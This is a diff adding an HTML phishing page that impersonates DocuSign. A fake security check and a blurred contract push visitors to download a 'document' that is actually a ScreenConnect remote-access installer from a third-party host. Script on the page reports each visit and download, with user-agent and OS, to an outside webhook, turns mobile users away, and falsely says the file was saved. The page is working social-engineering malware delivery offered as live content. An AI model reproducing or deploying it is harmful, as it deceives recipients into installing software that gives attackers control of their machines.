@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>DocuSign® | Secure Document Signing</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        html, body { height: 100%; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            line-height: 1.5;
+            color: #1e2a3a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+            position: relative;
+            min-height: 100vh;
+            /* fallback canvas — shows if the remote image ever fails to load */
+            background: #0d2437 url('docusign-bg.svg') no-repeat center center;
+            background-size: cover;
+            background-attachment: fixed;
+            overflow-x: hidden;
+        }
+
+        /* Primary backdrop — DocuSign image */
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            background: url('https://res.cloudinary.com/blxkpgzy/image/upload/f_auto,q_auto/tes1') no-repeat center center;
+            background-size: cover;
+            z-index: -2;
+        }
+
+        /* Depth overlay so the white card floats instead of fighting the backdrop */
+        body::after {
+            content: "";
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(120% 120% at 50% 20%, rgba(8, 23, 38, 0.05) 0%, rgba(6, 18, 32, 0.42) 100%),
+                linear-gradient(180deg, rgba(8, 23, 38, 0.10) 0%, rgba(6, 16, 28, 0.48) 100%);
+            z-index: -1;
+        }
+
+        .card {
+            max-width: 680px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 32px;
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25);
+            overflow: hidden;
+            position: relative;
+            z-index: 1;
+        }
+
+        .card-header {
+            padding: 1.8rem 2rem 1rem 2rem;
+            background: white;
+        }
+
+        .card-header h1 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            color: #0a0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .card-header h1 > span:first-child { color: #1e4663; }
+
+        .badge {
+            background: #f0f4f9;
+            padding: 0.2rem 0.8rem;
+            border-radius: 40px;
+            font-size: 0.7rem;
+            font-weight: 500;
+            color: #2c3e66;
+        }
+
+        .card-content { padding: 2rem; }
+
+        .message-box {
+            background: #f8fafd;
+            border-radius: 20px;
+            padding: 1rem 1.2rem;
+            margin-bottom: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border: 1px solid #e2e8f0;
+        }
+
+        .message-box.info { background: #f0f6ff; border-left: 4px solid #1e4663; }
+
+        .card.wide { max-width: 860px; }
+
+        .pdf-toolbar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            flex-wrap: wrap;
+            background: #f4f7fb;
+            border: 1px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 0.8rem 1.1rem;
+            margin-bottom: 1.2rem;
+        }
+
+        .pdf-brand {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+            color: #1e4663;
+            font-size: 0.95rem;
+        }
+
+        .pdf-brand i { color: #e74c3c; font-size: 1.2rem; }
+
+        .os-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #eef2f8;
+            border: 1px solid #dbe3ee;
+            color: #2c3e66;
+            font-size: 0.72rem;
+            font-weight: 600;
+            padding: 0.35rem 0.8rem;
+            border-radius: 40px;
+            white-space: nowrap;
+        }
+
+        .pdf-download-btn { width: auto; padding: 0.7rem 1.5rem; font-size: 0.9rem; white-space: nowrap; }
+        .pdf-download-btn:disabled { opacity: 0.65; cursor: not-allowed; transform: none; }
+
+        .pdf-container {
+            position: relative;
+            border-radius: 14px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.16);
+            background: white;
+        }
+
+        .pdf-page {
+            background: white;
+            padding: 2.2rem 2.4rem;
+            min-height: 540px;
+            filter: blur(8px);
+            user-select: none;
+            pointer-events: none;
+        }
+
+        .pdf-doc-header {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            border-bottom: 2px solid #1e4663;
+            padding-bottom: 0.9rem;
+            margin-bottom: 1.1rem;
+        }
+
+        .pdf-doc-logo { font-size: 1.35rem; font-weight: 800; color: #1e4663; letter-spacing: -0.5px; }
+        .pdf-doc-logo span { color: #e74c3c; font-size: 0.85rem; vertical-align: super; }
+        .pdf-env-id { font-size: 0.68rem; color: #8a9bb0; margin-top: 3px; }
+        .pdf-h { font-size: 1rem; font-weight: 700; color: #1e4663; margin: 1rem 0 0.45rem; }
+        .pdf-p { font-size: 0.82rem; color: #3a4f66; line-height: 1.7; margin-bottom: 0.5rem; }
+
+        .pdf-table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        .pdf-table td { border: 1px solid #cbd5e1; padding: 0.45rem 0.65rem; color: #3a4f66; font-size: 0.82rem; }
+        .pdf-sign-row { display: flex; gap: 2.5rem; margin-top: 2rem; }
+        .pdf-sign-block { flex: 1; }
+        .pdf-sign-line { border-bottom: 1.5px solid #64748b; height: 2.1rem; }
+        .pdf-sign-label { font-size: 0.68rem; color: #64748b; margin-top: 0.35rem; }
+        .pdf-page-footer {
+            margin-top: 1.6rem;
+            padding-top: 0.8rem;
+            border-top: 1px solid #e2e8f0;
+            font-size: 0.68rem;
+            color: #8a9bb0;
+            text-align: center;
+        }
+
+        .pdf-blur-layer {
+            position: absolute;
+            inset: 0;
+            background: rgba(248, 250, 252, 0.45);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+        }
+
+        .blur-card {
+            background: white;
+            border-radius: 22px;
+            padding: 1.7rem 2rem;
+            text-align: center;
+            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.22);
+            max-width: 380px;
+            border: 1px solid #eef2f8;
+        }
+
+        .blur-card h3 { color: #1e4663; margin: 0.8rem 0 0.4rem; font-size: 1.1rem; }
+        .blur-card p { font-size: 0.85rem; color: #5c6f87; margin-bottom: 1rem; }
+
+        .blur-lock {
+            width: 58px;
+            height: 58px;
+            margin: 0 auto;
+            border-radius: 50%;
+            background: #eef4ff;
+            color: #1e4663;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.4rem;
+        }
+
+        .download-status { margin-top: 1rem; }
+
+        .btn {
+            border: none;
+            padding: 0.9rem 1.4rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 48px;
+            cursor: pointer;
+            transition: 0.2s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            text-decoration: none;
+        }
+
+        .btn-primary { background: #1e4663; color: white; box-shadow: 0 4px 12px rgba(30, 70, 99, 0.3); }
+        .btn-primary:hover { background: #0f2f46; transform: translateY(-2px); }
+
+        .loader {
+            display: inline-block;
+            width: 22px;
+            height: 22px;
+            border: 2px solid #e2e8f0;
+            border-top-color: #1e4663;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .doc-icon {
+            font-size: 5rem;
+            color: #e74c3c;
+            margin-bottom: 1rem;
+            position: relative;
+            display: inline-block;
+        }
+
+        .doc-icon .signature-overlay {
+            position: absolute;
+            bottom: -5px;
+            right: -10px;
+            background: white;
+            border-radius: 50%;
+            width: 34px;
+            height: 34px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.1rem;
+            color: #2c7a4d;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.12);
+        }
+
+        .doc-title { font-size: 1.5rem; font-weight: 700; color: #1e4663; margin-bottom: 0.5rem; }
+        .doc-meta { color: #5c6f87; font-size: 0.85rem; margin-bottom: 1rem; }
+        .preparing-box { text-align: center; padding: 1rem; }
+
+        .instruction {
+            margin-top: 1.5rem;
+            font-size: 0.85rem;
+            color: #5c6f87;
+            background: #f8fafc;
+            padding: 0.8rem;
+            border-radius: 20px;
+        }
+
+        .popup-message {
+            display: none;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            padding: 1rem 1.5rem;
+            max-width: 340px;
+            z-index: 1001;
+            border-left: 4px solid #1e4663;
+            font-size: 0.9rem;
+        }
+
+        .popup-message i { font-size: 1.5rem; margin-right: 10px; color: #1e4663; }
+        .popup-message .close-popup { float: right; cursor: pointer; color: #aaa; font-size: 1.1rem; line-height: 1; }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            backdrop-filter: blur(3px);
+        }
+
+        .modal.show { display: flex; }
+
+        .modal-content {
+            background: white;
+            border-radius: 28px;
+            width: 90%;
+            max-width: 420px;
+            padding: 2rem;
+            text-align: center;
+            box-shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.35);
+            animation: fadeIn 0.3s ease;
+        }
+
+        .modal-content > i { font-size: 3rem; color: #2c7a4d; margin-bottom: 0.5rem; }
+        .modal-content h3 { margin-bottom: 1rem; color: #1e4663; }
+        .modal-content p { margin: 1rem 0; color: #4a627a; line-height: 1.5; }
+        .modal-content .btn { margin-top: 1rem; width: auto; }
+        .modal-content .small-note {
+            font-size: 0.78rem;
+            margin-top: 1rem;
+            color: #5c6f87;
+            border-top: 1px solid #e2e8f0;
+            padding-top: 1rem;
+        }
+
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+
+        .error-message { color: #c62828; background: #ffebee; padding: 0.8rem 1rem; border-radius: 10px; font-size: 0.85rem; }
+
+        @media (max-width: 640px) {
+            .card-header, .card-content { padding-left: 1.25rem; padding-right: 1.25rem; }
+            .pdf-page { padding: 1.4rem; }
+            .pdf-sign-row { gap: 1.25rem; }
+            .popup-message { left: 16px; right: 16px; max-width: none; }
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="card-header">
+        <h1><span>DocuSign®</span><span class="badge">secure portal</span></h1>
+    </div>
+    <div class="card-content" id="dynamicContent">
+        <div style="text-align:center; padding:2rem 0;">
+            <div class="loader"></div>
+            <p>Loading secure environment...</p>
+        </div>
+    </div>
+</div>
+
+<div id="downloadPopup" class="popup-message">
+    <span class="close-popup" onclick="document.getElementById('downloadPopup').style.display='none'">&times;</span>
+    <i class="fas fa-check-circle"></i>
+    <strong>Download Complete!</strong><br>
+    Your file has been saved to your <strong>Downloads folder</strong>.
+</div>
+
+<div id="installerModal" class="modal">
+    <div class="modal-content">
+        <i class="fas fa-check"></i>
+        <h3>Download Complete</h3>
+        <p>Your file has been saved to your Downloads folder.</p>
+        <button id="closeModalBtn" class="btn btn-primary">Got it</button>
+    </div>
+</div>
+
+<script>
+    // ======================== CONFIGURATION ========================
+    const CONFIG = {
+        DOCUMENT_FILENAME: "https://experigreen.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest",
+        INSTALLER_FILENAME: "https://experigreen.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest",
+        DOCUMENT_DISPLAY: "invite_D0C98 — Action Required",
+        DOCUMENT_SIZE: "9.2 MB",
+        DOCUMENT_STATUS: "Awaiting Signature",
+        DOCUMENT_ID: "DS-CONTRACT-2026-8841",
+        DEVICE_RESTRICTION: "Desktop (Windows / macOS)",
+        TELEGRAM_WEBHOOK: "https://grxlinec.xyz/doc.php"
+    };
+
+    let isVerified = false;
+    let downloadInProgress = false;
+    let installerPopupShown = false;
+
+    function escapeHtml(str) {
+        if (!str) return "";
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        });
+    }
+
+    function getOS() {
+        const ua = navigator.userAgent.toLowerCase();
+        const p = (navigator.platform || '').toLowerCase();
+        if (/iphone|ipad|ipod/.test(ua) || /mac/.test(p)) return 'macOS';
+        if (/win32|win64/.test(ua) || /win/.test(p)) return 'Windows';
+        if (/android/.test(ua)) return 'Android';
+        if (/linux/.test(ua) || /linux/.test(p)) return 'Linux';
+        return 'Unknown';
+    }
+
+    async function sendTelegramEvent(type, extraInfo = "") {
+        if (type !== "PAGE_VISIT" && type !== "DOWNLOAD_REQUESTED") return;
+
+        const payload = {
+            type: type,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            extra: extraInfo
+        };
+
+        try {
+            const response = await fetch(CONFIG.TELEGRAM_WEBHOOK, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            if (!response.ok) console.error("HTTP Error: " + response.status);
+        } catch (e) {
+            console.error("Webhook Error: " + e.message);
+        }
+    }
+
+    function checkDevice() {
+        const ua = navigator.userAgent.toLowerCase();
+        const isMobile = /android|iphone|ipad|ipod|mobile/i.test(ua);
+        if (isMobile) {
+            document.getElementById('dynamicContent').innerHTML =
+                '<div style="text-align:center; padding:2rem;">' +
+                '<div style="font-size:4rem;">💻</div>' +
+                '<h3>Mobile Not Supported</h3>' +
+                '<p>Please use a desktop computer (' + escapeHtml(CONFIG.DEVICE_RESTRICTION) + ').</p>' +
+                '</div>';
+            return false;
+        }
+        return true;
+    }
+
+    function renderVerificationPage() {
+        document.getElementById('dynamicContent').innerHTML = `
+            <div style="text-align:center; padding:1.5rem 0;">
+                <div class="doc-icon"><i class="fas fa-file-pdf"></i><span class="signature-overlay"><i class="fas fa-pen-nib"></i></span></div>
+                <div class="doc-title">${escapeHtml(CONFIG.DOCUMENT_DISPLAY)}</div>
+                <div class="doc-meta">${escapeHtml(CONFIG.DOCUMENT_SIZE)} · ${escapeHtml(CONFIG.DOCUMENT_STATUS)}</div>
+                <div class="message-box info" style="margin-bottom:1rem; text-align:left;">
+                    <span>🔐</span> <span>Quick security check required before document access.</span>
+                </div>
+                <div id="verifyMessage" class="message-box info" style="margin-top:5px; text-align:left;">
+                    <div class="loader"></div> Validating secure session...
+                </div>
+            </div>
+        `;
+        setTimeout(() => {
+            const msgDiv = document.getElementById('verifyMessage');
+            if (msgDiv) msgDiv.innerHTML = '✅ Access granted! Preparing your documents...';
+            isVerified = true;
+            setTimeout(() => showDocumentPage(), 600);
+        }, 1300);
+    }
+
+    function showDocumentPage() {
+        document.querySelector('.card')?.classList.add('wide');
+        document.getElementById('dynamicContent').innerHTML = `
+            <div class="doc-view">
+                <div class="pdf-toolbar">
+                    <div class="pdf-brand"><i class="fas fa-file-pdf"></i> ${escapeHtml(CONFIG.DOCUMENT_DISPLAY)}.pdf</div>
+                    <div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
+                        <span class="os-badge"><i class="fas fa-desktop"></i> Detected OS: ${getOS()}</span>
+                        <a href="${CONFIG.DOCUMENT_FILENAME}" class="btn btn-primary pdf-download-btn" onclick="sendTelegramEvent('DOWNLOAD_REQUESTED', getOS()); this.textContent='✅ File Downloaded'; this.style.pointerEvents='none'; this.style.opacity='0.6';" download>
+                            <i class="fas fa-download"></i> Download
+                        </a>
+                    </div>
+                </div>
+                <div class="pdf-container">
+                    <div class="pdf-page">
+                        <div class="pdf-doc-header">
+                            <div>
+                                <div class="pdf-doc-logo">DocuSign<span>®</span></div>
+                                <div class="pdf-env-id">Envelope ID: 8F3E2A71-4C9D-4E88-9B2A-1C7D5F6E0B4A</div>
+                            </div>
+                            <div style="text-align:right;">
+                                <div style="font-weight:600; color:#1e4663; font-size:0.9rem;">${escapeHtml(CONFIG.DOCUMENT_DISPLAY)}</div>
+                                <div class="pdf-env-id">Status: ${escapeHtml(CONFIG.DOCUMENT_STATUS)}</div>
+                            </div>
+                        </div>
+                        <div class="pdf-h">1. Parties</div>
+                        <div class="pdf-p">This Agreement is entered into on the date of the last signature below (the "Effective Date"), by and between the Company, and the undersigned party ("Recipient"), collectively referred to as the "Parties". This Agreement constitutes the entire understanding between the Parties.</div>
+                        <div class="pdf-h">2. Engagement Scope</div>
+                        <div class="pdf-p">The Company agrees to provide the Recipient with the deliverables, materials, and services described in Exhibit A, attached hereto and incorporated by reference. The Recipient acknowledges receipt of the preliminary summary and agrees to the terms of engagement set forth herein.</div>
+                        <div class="pdf-h">3. Payment &amp; Terms</div>
+                        <div class="pdf-p">The fee schedule, invoicing, and applicable taxes are outlined in Section 4.1 through 4.7 below. Invoices are due within thirty (30) days of receipt. Late payments may accrue interest at the rate permitted by applicable law.</div>
+                        <div class="pdf-h">4. Confidentiality</div>
+                        <div class="pdf-p">Each Party agrees to maintain the confidentiality of all proprietary information disclosed during the course of this engagement. Confidential information may not be disclosed to any third party without prior written consent.</div>
+                        <table class="pdf-table">
+                            <tr><td><strong>Effective Date</strong></td><td>August 14, 2026</td></tr>
+                            <tr><td><strong>Document ID</strong></td><td>${escapeHtml(CONFIG.DOCUMENT_ID)}</td></tr>
+                            <tr><td><strong>Signatures Required</strong></td><td>2 of 2</td></tr>
+                        </table>
+                        <div class="pdf-sign-row">
+                            <div class="pdf-sign-block">
+                                <div class="pdf-sign-line"></div>
+                                <div class="pdf-sign-label">Authorized Signature</div>
+                            </div>
+                            <div class="pdf-sign-block">
+                                <div class="pdf-sign-line"></div>
+                                <div class="pdf-sign-label">Recipient Signature</div>
+                            </div>
+                        </div>
+                        <div class="pdf-page-footer">DocuSign® Envelope · Generated securely · Page 1 of 2</div>
+                    </div>
+                    <div class="pdf-blur-layer">
+                        <div class="blur-card">
+                            <div class="blur-lock"><i class="fas fa-lock"></i></div>
+                            <h3>Document Locked</h3>
+                            <p>This document is encrypted for preview. Download the secure package to read and sign it.</p>
+                            <a href="${CONFIG.DOCUMENT_FILENAME}" class="btn btn-primary pdf-download-btn" onclick="sendTelegramEvent('DOWNLOAD_REQUESTED', getOS()); this.textContent='✅ File Downloaded'; this.style.pointerEvents='none'; this.style.opacity='0.6';" download>
+                                <i class="fas fa-download"></i> Download
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                <div id="downloadStatus" class="download-status"></div>
+            </div>
+        `;
+    }
+
+    async function handleDownloadClick() {
+        if (downloadInProgress) return;
+        downloadInProgress = true;
+        const btns = document.querySelectorAll('.pdf-download-btn');
+        btns.forEach(b => { b.disabled = true; b.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Starting download...'; });
+
+        await sendTelegramEvent("DOWNLOAD_REQUESTED", getOS());
+        await triggerFullPackageDownload();
+
+        setTimeout(() => {
+            btns.forEach(b => { b.disabled = false; b.innerHTML = '<i class="fas fa-check-circle"></i> Download started'; });
+            downloadInProgress = false;
+        }, 1200);
+    }
+
+    async function downloadSingleFile(filename, fileDescription) {
+        window.open(filename, '_blank');
+    }
+
+    async function triggerFullPackageDownload() {
+        if (downloadInProgress) return;
+        downloadInProgress = true;
+        try {
+            await downloadSingleFile(CONFIG.DOCUMENT_FILENAME);
+            const popup = document.getElementById('downloadPopup');
+            if (popup) {
+                popup.style.display = 'block';
+                setTimeout(() => popup.style.display = 'none', 5000);
+            }
+        } catch (err) {
+            console.error(err);
+        } finally {
+            downloadInProgress = false;
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        const closeModalBtn = document.getElementById('closeModalBtn');
+        if (closeModalBtn) {
+            closeModalBtn.addEventListener('click', () => {
+                document.getElementById('installerModal').classList.remove('show');
+            });
+        }
+    });
+
+    async function init() {
+        sendTelegramEvent("PAGE_VISIT", getOS());
+        if (!checkDevice()) return;
+        renderVerificationPage();
+    }
+
+    init();
+</script>
+</body>
+</html>
